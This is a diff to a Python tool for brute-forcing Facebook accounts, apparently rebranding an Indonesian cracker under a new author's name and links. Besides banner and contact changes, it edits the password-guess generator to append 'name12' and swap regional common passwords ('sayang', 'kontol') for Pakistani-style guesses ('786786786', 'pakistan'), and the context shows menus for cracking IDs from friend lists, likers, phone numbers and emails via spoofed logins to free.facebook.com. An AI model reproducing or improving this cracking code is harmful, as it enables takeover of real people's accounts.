@@ -44,14 +44,7 @@ else:
 ### HEADERS ###
 
 def banner():
-    print("""
-\033[1;36m______________________________________________\033[1;37m\033[1;91m   
-   __     ___\033[1;37m  ©
-\033[1;91m  / /    / __\ \033[1;37m|| \033[1;33m•\033[1;91m•\033[1;37m SYAFIK\033[1;91mXD\033[1;37m SENP4ii.
-\033[1;91m / /    / /    \033[1;37m|| \033[1;33m•\033[1;91m•\033[1;91m instagram\033[1;37m.\033[1;91mcom\033[1;37m/nO
-\033[1;91m/ /___ / /___  \033[1;37m|| \033[1;33m•\033[1;91m•\033[1;37m Version\033[1;91m 1\033[1;37m.\033[1;91m0\033[1;37m
-\033[1;91m\____/ \____/  \033[1;37m|| \033[1;33m•\033[1;91m•\033[1;91m H\033[1;37ma\033[1;91mc\033[1;37mk \033[1;91mF\033[1;37ma\033[1;91mc\033[1;37meb\033[1;91moo\033[1;37mk
-\033[1;36m______________________________________________\033[1;37m""")
+    os.system('echo -e "\n\n\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀\n\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  \n\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  \n\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mQUEEN\n\033[1;94m===============================================\n\033[1;90m➣ Author : \033[1;97mSTYLISH QUEEN\n\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-queen\n\033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official\n\033[1;94m===============================================" | lolcat')
 
 ua ="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 ua2 ="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
@@ -144,7 +137,7 @@ def ige():
     banner()
     input(p+"\n ["+k+"•"+m+"•"+p+"] Open FACEBOOK? ")
     jalan(p+" ["+k+"•"+m+"•"+p+"] Open FACEBOOK...")
-    os.system("xdg-open https://www.facebook.com/syafik.rupat.3")
+    os.system("xdg-open https://m.facebook.com/jam.shahrukh.official")
     input(p+" [BACK]")
     logs()   
 
@@ -154,7 +147,7 @@ def kontolrecode():
     banner()
     input(p+"\n ["+k+"•"+m+"•"+p+"] Open Youtube? ")
     jalan(p+" ["+k+"•"+m+"•"+p+"] Open Youtube...")
-    os.system("xdg-open https://youtu.be/fbD0ArCzJ0k")
+    os.system("xdg-open https://youtu.be/UCtiBO4aL6y-W80hjeGZyd7g")
     input(p+" [BACK]")
     logs()   
 
@@ -164,7 +157,7 @@ def fbe():
     banner()
     input(p+"\n ["+k+"•"+m+"•"+p+"] Report Bug? ")
     jalan(p+" ["+k+"•"+m+"•"+p+"] Open WhatsApp...")
-    os.system("xdg-open https://wa.me/+6282386854238")
+    os.system("xdg-open https://wa.me/+923053176060")
     input(p+" [BACK]")
     logs()  
     
@@ -175,7 +168,7 @@ def logs():
   print ("")
   print((p+" ["+o+"01"+p+"] Login Token"))
   print((p+" ["+o+"02"+p+"] Login Cookies"))
-  print((p+" ["+o+"03"+p+"] Tonton Cara Ambil Token"))
+  print((p+" ["+o+"03"+p+"] Open My YouTube Channel"))
   print((p+" ["+o+"04"+p+"] Report Bug Tools"))
   print((p+" ["+o+"05"+p+"] Contact Author"))
   print((p+" ["+o+"00"+p+"] Exit\n"))
@@ -236,12 +229,12 @@ def menu():
     os.system("clear")
     banner()
     print((p+"\n [ Welcome User \033[1;33m"+a["name"]+p+" ]"+p))
-    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your Status  : \033[1;33m*Premium"+p))
+    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your Status  : "+m+"J A M x S A N I"+p))
     print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your ID      : \033[1;33m"+id))
     print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your Ip      : \033[1;33m"+ip))
-    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your Joined  : \033[1;33m"+durasi))
+    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your Joined  : \033[1;33m"+Successful))
     print((p+"\n ["+o+"01"+p+"]"+h+" Crack ID From Public/Friendlist"))
-    print((p+" ["+o+"02"+p+"]"+u+" Crack ID From Likers Post"))
+    print((p+" ["+o+"02"+p+"]"+u+" Crack ID From Likes Post"))
     print((p+" ["+o+"03"+p+"]"+p+" Crack ID From Followers"))
     print((p+" ["+o+"04"+p+"]"+m+" Crack Phone Number"))
     print((p+" ["+o+"05"+p+"]"+k+" Crack Email"))
@@ -485,19 +478,21 @@ def generate(text):
 		else:
 			i=i.lower()
 			if len(i)==3 or len(i)==4 or len(i)==5:
+				results.append(i+"12")
 				results.append(i+"123")
 				results.append(i+"12345")
 			else:
+				results.append(i+"12")
 				results.append(i+"123")
 				results.append(i+"12345")
 				results.append(i)
 				if "indonesia" in ips:
-					results.append("sayang")
-					results.append("kontol")
-					results.append("anjing")
-					results.append("bismillah")
-					results.append("bajingan")
-					results.append("bangsat")
+					results.append("234567")
+					results.append("223344")
+					results.append("786786786")
+					results.append("556677")
+					results.append("pakistan")
+					results.append("654321")
 	return results
 
 ### MODULE CRACK ###
@@ -564,7 +559,7 @@ def ttll(em,pas,hosts):
 def f_fb(em,pas,hosts):
 	global ua
 	r=requests.Session()
-	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 	p=r.get("https://free.facebook.com/")
 	b=bs4.BeautifulSoup(p.text,"html.parser")
 	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
@@ -654,7 +649,7 @@ class crack:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
+				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -743,7 +738,7 @@ class crackttl:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
+				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -840,7 +835,7 @@ class crekm:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
+				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -929,7 +924,7 @@ class crekmttl:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
+				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -1026,7 +1021,7 @@ class tofbe:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
+				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -1115,7 +1110,7 @@ class tofbettl:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
+				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -1212,7 +1207,7 @@ class freefb:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
+				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -1301,7 +1296,7 @@ class freefbttl:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
+				print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -1394,8 +1389,8 @@ class bapi:
               print((k+"["+p+"!"+k+"]"+p+" %s"%e))
               continue
           self.fl=[]
-          print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
-          self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
+          print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
+          self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password Put : ").split(",")
           if len(self.pw) ==0:
             continue
           for i in self.fs:
@@ -1504,8 +1499,8 @@ class bapittl:
               print((k+"["+p+"!"+k+"]"+p+" %s"%e))
               continue
           self.fl=[]
-          print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
-          self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
+          print((p+" ["+k+"•"+m+"•"+p+"] Example : Type Your Choice Pass"))
+          self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password Put : ").split(",")
           if len(self.pw) ==0:
             continue
           for i in self.fs:
